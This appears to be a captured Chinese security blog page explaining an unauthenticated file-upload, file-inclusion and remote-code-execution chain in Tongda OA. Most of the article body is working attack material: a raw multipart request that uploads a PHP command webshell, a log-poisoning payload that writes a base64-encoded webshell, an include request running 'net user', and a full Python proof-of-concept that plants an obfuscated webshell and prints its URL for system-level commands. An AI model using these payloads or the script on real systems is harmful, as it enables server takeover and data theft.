@@ -1,0 +1,358 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="通达oa 任意文件上传+rce+文件包含一、漏洞简介有些版本gateway.php路径不同 例如2013： http:&#x2F;&#x2F;www.0-sec.org&#x2F;ispirit&#x2F;im&#x2F;upload.php http:&#x2F;&#x2F;www.0-sec.org&#x2F;ispirit&#x2F;interface&#x2F;gateway.php  例如2017： http:&#x2F;&#x2F;www.0-sec.org&#x2F;ispirit&#x2F;im&#x2F;upload.php">
+<meta property="og:type" content="article">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/%E9%80%9A%E8%BE%BEoa/%E9%80%9A%E8%BE%BEoa%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0+rce+%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:description" content="通达oa 任意文件上传+rce+文件包含一、漏洞简介有些版本gateway.php路径不同 例如2013： http:&#x2F;&#x2F;www.0-sec.org&#x2F;ispirit&#x2F;im&#x2F;upload.php http:&#x2F;&#x2F;www.0-sec.org&#x2F;ispirit&#x2F;interface&#x2F;gateway.php  例如2017： http:&#x2F;&#x2F;www.0-sec.org&#x2F;ispirit&#x2F;im&#x2F;upload.php">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://she11c0de.github.io/resource/%E9%80%9A%E8%BE%BEoa%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0+rce+%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/media/rId24.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/%E9%80%9A%E8%BE%BEoa%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0+rce+%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/media/rId25.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/%E9%80%9A%E8%BE%BEoa%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0+rce+%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/media/rId26.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/%E9%80%9A%E8%BE%BEoa%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0+rce+%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/media/rId27.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/%E9%80%9A%E8%BE%BEoa%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0+rce+%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/media/rId28.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/%E9%80%9A%E8%BE%BEoa%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0+rce+%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/media/rId29.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/%E9%80%9A%E8%BE%BEoa%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0+rce+%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/media/rId30.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/%E9%80%9A%E8%BE%BEoa%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0+rce+%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/media/rId31.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/%E9%80%9A%E8%BE%BEoa%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0+rce+%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/media/rId32.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/%E9%80%9A%E8%BE%BEoa%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0+rce+%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/media/rId33.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/%E9%80%9A%E8%BE%BEoa%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0+rce+%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/media/rId34.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/%E9%80%9A%E8%BE%BEoa%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0+rce+%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/media/rId35.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/%E9%80%9A%E8%BE%BEoa%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0+rce+%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/media/rId36.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/%E9%80%9A%E8%BE%BEoa%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0+rce+%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/media/rId37.png">
+<meta property="article:published_time" content="2022-07-08T06:26:11.098Z">
+<meta property="article:modified_time" content="2022-07-08T07:24:51.296Z">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://she11c0de.github.io/resource/%E9%80%9A%E8%BE%BEoa%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0+rce+%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/media/rId24.png">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-通达oa/通达oa 任意文件上传+rce+文件包含" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/%E9%80%9A%E8%BE%BEoa/%E9%80%9A%E8%BE%BEoa%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0+rce+%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" class="article-date">
+  <time datetime="2022-07-08T06:26:11.098Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="通达oa-任意文件上传-rce-文件包含"><a href="#通达oa-任意文件上传-rce-文件包含" class="headerlink" title="通达oa 任意文件上传+rce+文件包含"></a>通达oa 任意文件上传+rce+文件包含</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>有些版本gateway.php路径不同</p>
+<p>例如2013：</p>
+<pre><code>http://www.0-sec.org/ispirit/im/upload.php
+http://www.0-sec.org/ispirit/interface/gateway.php
+</code></pre>
+<p>例如2017：</p>
+<pre><code>http://www.0-sec.org/ispirit/im/upload.php
+http://www.0-sec.org/mac/gateway.php
+
+C:\MYOA&gt;dir /s /b gateway.php
+C:\MYOA\webroot\mac\gateway.php
+</code></pre>
+<p>2015没有文件包含，官方给的补丁2017的没有修复文件包含，所以还有很多种包含日志文件getshell的姿势，不一定要文件上传。</p>
+<pre><code>http://www.0-sec.org/api/ddsuite/error.php
+
+POST:message=&lt;?php file_put_contents(&quot;2.php&quot;,base64_decode(&quot;PD9waHAgYXNzZXJ0KCRfUE9TVFsxXSk7Pz4=&quot;));?&gt;52011 
+
+然后包含
+
+http://www.0-sec.org/mac/gateway.php
+POST:json=&#123;&quot;url&quot;:&quot;..\/..\/logs\/oa\/2003\/dd_error.log&quot;&#125;
+
+在http://192.168.124.138/mac/2.php就是shell密码1
+</code></pre>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>V11版2017版2016版2015版2013增强版2013版</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>我们根据官网发布的补丁，更新的是ispirit/im/upload.php这个文件，我们跟进这个文件</p>
+<p><img src="/resource/%E9%80%9A%E8%BE%BEoa%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0+rce+%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/media/rId24.png"></p>
+<p>当传入P参数时，就可以绕过登录认证，直接获取到session。</p>
+<p><img src="/resource/%E9%80%9A%E8%BE%BEoa%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0+rce+%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/media/rId25.png"></p>
+<p>跟进函数流程，逻辑判断是否传入DEST_UID并且不为0，否则直接退出。</p>
+<p><img src="/resource/%E9%80%9A%E8%BE%BEoa%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0+rce+%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/media/rId26.png"></p>
+<p>传入一个DEST_UID后，访问，提示无文件上传</p>
+<p><img src="/resource/%E9%80%9A%E8%BE%BEoa%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0+rce+%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/media/rId27.png"></p>
+<p>1&lt;=count($_FILES)判断是否有文件上传，后面的逻辑，如果传入文件，直接进入未授权任意文件上传</p>
+<p><img src="/resource/%E9%80%9A%E8%BE%BEoa%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0+rce+%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/media/rId28.png"></p>
+<p>可以使用python3的requests库进行文件上传操作，跟进代码，后面判断的是UPLOAD_MODE上传模式的值，如果传入UPLOAD_MODE，当取值为1，2，3时，将回显。</p>
+<p><img src="/resource/%E9%80%9A%E8%BE%BEoa%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0+rce+%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/media/rId29.png"></p>
+<p><img src="/resource/%E9%80%9A%E8%BE%BEoa%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0+rce+%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/media/rId30.png"></p>
+<p>进入上传逻辑，调用upload()函数，upload()会对上传的文件进行后缀名检测，这里使用name.php.即可绕过文件后缀名限制，调用upload函数后，会返回一个$ATTACHMENTS数组，这也是后面我们传入上传模式UPLOAD_MODE值时会根据该值的取值返回$ATTACHMENTS[ID]和$ATTACHMENTS[NAME]</p>
+<p><img src="/resource/%E9%80%9A%E8%BE%BEoa%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0+rce+%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/media/rId31.png"></p>
+<p>跟进upload()函数，$ATTACHMENTS[ID]由add_attach()函数返回在add_attach()可以看到传入的文件存储路径为</p>
+<p><img src="/resource/%E9%80%9A%E8%BE%BEoa%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0+rce+%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/media/rId32.png"></p>
+<p>$MODULE的值在upload.php文件中指定为im</p>
+<p><img src="/resource/%E9%80%9A%E8%BE%BEoa%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0+rce+%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/media/rId33.png"></p>
+<p>存储路径就保存在在upload.php文件中指定的attch/im/$YM/文件夹下面，文件名就是$ATTACH_ID.$ATTACH_FILEadd_attach()函数最终返回的前台的能够回显的$ATTACHMENTS[ID]里面就包含上传的文件名和路径。</p>
+<p><img src="/resource/%E9%80%9A%E8%BE%BEoa%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0+rce+%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/media/rId34.png"></p>
+<p>此时，我们就可以构造payloads进行任意文件上传</p>
+<p><img src="/resource/%E9%80%9A%E8%BE%BEoa%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0+rce+%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/media/rId35.png"></p>
+<p>但是，开发者指定的保存路径不在wwwroot目录下面，我们只能通过文件包含漏洞进行包含触发漏洞。文件包含漏洞出现在/ispirit/interface/gateway.php，首先接从客户端接收一个$json的参数，然后将$json转换为数组后再转换成变量，当存在$json数据中存在一个key为url的且不为空的值时，并且url传入的数据中有general/或者ispirit/或者module/时，执行include_once包含该url。</p>
+<p><img src="/resource/%E9%80%9A%E8%BE%BEoa%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0+rce+%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/media/rId36.png"></p>
+<p>此处文件包含的另外一个利用，直接触发nginx的错误日志，利用文件包含直接getshell</p>
+<p><img src="/resource/%E9%80%9A%E8%BE%BEoa%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0+rce+%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/media/rId37.png"></p>
+<h3 id="请求包"><a href="#请求包" class="headerlink" title="请求包"></a>请求包</h3><pre><code>POST /ispirit/im/upload.php HTTP/1.1
+Host: 10.10.20.116:88
+Content-Length: 658
+Cache-Control: no-cache
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundarypyfBh1YB4pV8McGB
+Accept: */*
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9,zh-HK;q=0.8,ja;q=0.7,en;q=0.6,zh-TW;q=0.5
+Cookie: PHPSESSID=123
+Connection: close
+
+------WebKitFormBoundarypyfBh1YB4pV8McGB
+Content-Disposition: form-data; name=&quot;UPLOAD_MODE&quot;
+
+2
+------WebKitFormBoundarypyfBh1YB4pV8McGB
+Content-Disposition: form-data; name=&quot;P&quot;
+
+123
+------WebKitFormBoundarypyfBh1YB4pV8McGB
+Content-Disposition: form-data; name=&quot;DEST_UID&quot;
+
+1
+------WebKitFormBoundarypyfBh1YB4pV8McGB
+Content-Disposition: form-data; name=&quot;ATTACHMENT&quot;; filename=&quot;jpg&quot;
+Content-Type: image/jpeg
+
+&lt;?php
+$command=$_POST[&#39;cmd&#39;];
+$wsh = new COM(&#39;WScript.shell&#39;);
+$exec = $wsh-&gt;exec(&quot;cmd /c &quot;.$command);
+$stdout = $exec-&gt;StdOut();
+$stroutput = $stdout-&gt;ReadAll();
+echo $stroutput;
+?&gt;
+------WebKitFormBoundarypyfBh1YB4pV8McGB--
+POST /mac/gateway.php HTTP/1.1
+Host: 10.10.20.116:88
+Connection: keep-alive
+Accept-Encoding: gzip, deflate
+Accept: */*
+User-Agent: python-requests/2.21.0
+Content-Length: 71
+Content-Type: application/x-www-form-urlencoded
+
+json=&#123;&quot;url&quot;:&quot;/general/../../attach/im/2003/938379153.jpg&quot;&#125;&amp;cmd=net user
+</code></pre>
+<h3 id="poc-（上传-文件包含-rce）"><a href="#poc-（上传-文件包含-rce）" class="headerlink" title="poc （上传+文件包含+rce）"></a>poc （上传+文件包含+rce）</h3><pre><code>import os
+import requests
+
+# 定义webshell，因为是包含，所以用写入马比较方便
+# 这个马自带bypass disable_function 功能
+shell = &#39;&#39;&#39;&lt;?php
+$fp = fopen(&#39;readme.php&#39;, &#39;w+&#39;);
+$a = base64_decode(&quot;JTNDJTNGcGhwJTBBJTI0Y29tbWFuZCUzRCUyNF9HRVQlNWIlMjdhJTI3JTVkJTNCJTBBJTI0d3NoJTIwJTNEJTIwbmV3JTIwQ09NJTI4JTI3V1NjcmlwdC5zaGVsbCUyNyUyOSUzQiUwQSUyNGV4ZWMlMjAlM0QlMjAlMjR3c2gtJTNFZXhlYyUyOCUyMmNtZCUyMC9jJTIwJTIyLiUyNGNvbW1hbmQlMjklM0IlMEElMjRzdGRvdXQlMjAlM0QlMjAlMjRleGVjLSUzRVN0ZE91dCUyOCUyOSUzQiUwQSUyNHN0cm91dHB1dCUyMCUzRCUyMCUyNHN0ZG91dC0lM0VSZWFkQWxsJTI4JTI5JTNCJTBBZWNobyUyMCUyNHN0cm91dHB1dCUzQiUwQSUzRiUzRQ==&quot;);
+fwrite($fp, urldecode($a));
+fclose($fp);
+?&gt;
+&#39;&#39;&#39;
+
+# 输入目标
+url = input(&quot;input the TARGET(example:[url]https://127.0.0.1:1080[/url])&gt;&quot;)
+# 定义上传目录和包含目录
+upload_url = url+&quot;/ispirit/im/upload.php&quot;
+include_url = url+&quot;/ispirit/interface/gateway.php&quot;
+# 定义shell目录，如果要修改名字，需要把shell里面的一起改了
+shell_url = url+&quot;/ispirit/interface/readme.php&quot;
+files = &#123;&#39;ATTACHMENT&#39;: shell&#125;
+# 参见源码，有漏洞的版本只要POST P和DEST_UID参数就会自动生成session
+upload_data = &#123;&quot;P&quot;: &quot;123&quot;, &quot;DEST_UID&quot;: &quot;1&quot;, &quot;UPLOAD_MODE&quot;: &quot;2&quot;&#125;
+# 上传
+upload_res = requests.post(upload_url, upload_data, files=files)
+# 此时会返回上传文件的路径
+path = upload_res.text
+# 解析返回值获取上传地址
+path = path[path.find(&#39;@&#39;)+1:path.rfind(&#39;|&#39;)
+            ].replace(&quot;_&quot;, &quot;\/&quot;).replace(&quot;|&quot;, &quot;.&quot;)
+# 由于上传文件会自动改为jpg，所以要用gateway.php包含
+include_data = &#123;&quot;json&quot;: &quot;&#123;\&quot;url\&quot;:\&quot;/general/../../attach/im/&quot; + path+&quot;\&quot;&#125;&quot;&#125;
+# 包含+自动写入shell
+include_res = requests.post(include_url, data=include_data)
+# 返回结果 a参数可以直接填入系统命令（比如whoami），默认是system权限
+print(&#39;shell is here:&#39;+shell_url+&#39;?a=command&#39;)
+</code></pre>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/%E9%80%9A%E8%BE%BEoa/%E9%80%9A%E8%BE%BEoa%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0+rce+%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" data-id="cl5c2r1cq00qzy8v1739c3xtz" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/07/07/%E9%80%9A%E8%BE%BEoa/%E9%80%9A%E8%BE%BEoa%20%E4%BB%BB%E6%84%8F%E8%B4%A6%E5%8F%B7%E8%B7%B3%E8%BD%AC/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/07/07/%E9%80%9A%E8%BE%BEoa/%E9%80%9A%E8%BE%BEoa%20%E4%BB%BB%E6%84%8F%E2%BD%82%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
